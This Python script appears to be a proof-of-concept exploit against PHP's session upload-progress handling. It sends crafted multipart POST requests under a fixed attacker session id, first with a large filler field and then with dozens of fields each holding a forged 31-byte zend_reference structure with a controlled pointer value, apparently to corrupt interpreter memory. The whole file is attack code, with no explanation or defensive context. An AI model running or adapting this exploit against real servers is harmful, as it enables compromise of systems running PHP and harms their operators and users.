#!/usr/bin/env python3
import os, socket, struct, sys, time
HOST=os.environ.get('HOST','127.0.0.1'); PORT=int(os.environ.get('PORT','8088'))
PATH=os.environ.get('PATH_INFO','/index.php'); SID=os.environ.get('SID','attacksessionid0001')
def multipart(parts,b):
    o=bytearray()
    for p in parts:
        o+=b'--'+b+b'\r\n'
        if 'filename' in p:
            o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
        else:
            o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
        o+=p['data']+b'\r\n'
    o+=b'--'+b+b'--\r\n'; return bytes(o)
def send(body,b,timeout=15):
    h=(f'POST {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={b.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
    s=socket.create_connection((HOST,PORT),timeout=timeout); s.settimeout(timeout)
    try: s.sendall(h+body)
    except OSError: pass
    d=b''
    try:
        while True:
            c=s.recv(65536)
            if not c: break
            d+=c
    except OSError: pass
    s.close(); return d
def req_a(mb=12):
    b=b'----SUPABOUNDARY7'
    return multipart([{'name':'PHPSESSID','data':SID.encode()},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},{'name':'f','filename':'a.txt','data':b'A'*64},{'name':'big','data':b'B'*(mb*1024*1024)}],b),b
def req_ref(count=40, val=None):
    b=b'BNDRY12345'
    parts=[{'name':'PHPSESSID','data':SID.encode()},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
    for i in range(count):
        parts.append({'name':'r%d'%i,'data':val})
    return multipart(parts,b),b
def main():
    mode=sys.argv[1] if len(sys.argv)>1 else 'ab'
    if mode in ('a','ab'):
        body,b=req_a(); print('A',len(body)); print(send(body,b).split(b'\r\n',1)[0]); time.sleep(0.4)
    if mode in ('ref','ab'):
        # 31-byte fake zend_reference: rc=1, type=10, val=0x4141414141414141, val.type=0x307
        v=struct.pack('<IIQIIQ',1,10,0x4141414141414141,0x307,0,0)[:31]
        body,b=req_ref(int(os.environ.get('COUNT','40')),v); print('B',len(body)); print(send(body,b).split(b'\r\n',1)[0])
if __name__=='__main__': main()
